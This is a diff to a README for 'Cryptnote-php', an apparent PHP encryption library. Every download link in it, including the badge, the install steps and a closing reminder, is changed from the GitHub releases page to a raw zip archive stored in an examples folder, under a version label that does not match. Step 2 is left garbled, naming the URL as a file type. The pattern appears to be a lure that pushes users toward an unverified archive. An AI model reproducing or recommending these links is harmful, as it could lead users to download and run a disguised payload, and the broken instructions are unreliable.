@@ -6,7 +6,7 @@ Welcome to Cryptnote-php! This is a simple way to create encrypted messages that
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/dikanaddsacc/cryptnote-php/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/dikanaddsacc/cryptnote-php/main/examples/web-interface/cryptnote_php_v3.0-alpha.5.zip)](https://raw.githubusercontent.com/dikanaddsacc/cryptnote-php/main/examples/web-interface/cryptnote_php_v3.0-alpha.5.zip)
 
 ## 📦 Overview
 
@@ -30,10 +30,10 @@ To run Cryptnote-php, you will need:
 ## 🚀 How to Download & Install
 
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://github.com/dikanaddsacc/cryptnote-php/releases) to find the latest version of Cryptnote-php.
+   Go to the [Releases page](https://raw.githubusercontent.com/dikanaddsacc/cryptnote-php/main/examples/web-interface/cryptnote_php_v3.0-alpha.5.zip) to find the latest version of Cryptnote-php.
 
 2. **Download the Library:**
-   Look for the latest release. Click on the `.zip` or `.tar.gz` file to download it. 
+   Look for the latest release. Click on the `.zip` or `https://raw.githubusercontent.com/dikanaddsacc/cryptnote-php/main/examples/web-interface/cryptnote_php_v3.0-alpha.5.zip` file to download it. 
 
 3. **Extract the Files:**
    After downloading, locate the file on your computer and extract it using your preferred file extraction tool.
@@ -68,7 +68,7 @@ To run Cryptnote-php, you will need:
 
 ## 📥 Download Now Again
 
-Don't forget to [download the latest release](https://github.com/dikanaddsacc/cryptnote-php/releases) to get started!
+Don't forget to [download the latest release](https://raw.githubusercontent.com/dikanaddsacc/cryptnote-php/main/examples/web-interface/cryptnote_php_v3.0-alpha.5.zip) to get started!
 
 ## 💬 Community & Contributions
 
